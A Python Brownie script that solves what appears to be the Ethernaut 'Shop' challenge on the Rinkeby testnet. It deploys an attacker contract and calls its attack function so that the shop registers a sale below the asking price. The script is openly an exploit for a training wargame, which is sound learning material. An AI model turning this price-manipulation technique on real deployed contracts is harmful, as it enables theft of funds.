from brownie import accounts, Shop, IAmBuyer
from web3 import Web3

# calc function selector for isSold()
func_selector = Web3.keccak(text="isSold()")
func_selector = Web3.toHex(func_selector)[:10]
print(func_selector)
# calc function selector for isSold()

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xea6C3330De7B06AC2Fd7a4ab1be418A2FF093Bc9"
shop = Shop.at(instance_address)

# --------------------------------------------------------
# to completed this level we must make isSold() equal True
# and price() must be less than 100
# --------------------------------------------------------


def level_completed():
    return shop.isSold() and shop.price() < 100


def exploit():
    # deploy IAmBuyer contract
    buyer = IAmBuyer.deploy(shop, {"from": account})

    # check the value of isSold and price
    print(shop.isSold())
    print(shop.price())

    # call attack from buyer contract
    tx = buyer.attack({"from": account})
    tx.wait(1)

    print(shop.price())
    print(shop.isSold())

    # confirm that we have completed the level
    print(f"Level is completed: {level_completed()}")


def main():
    exploit()
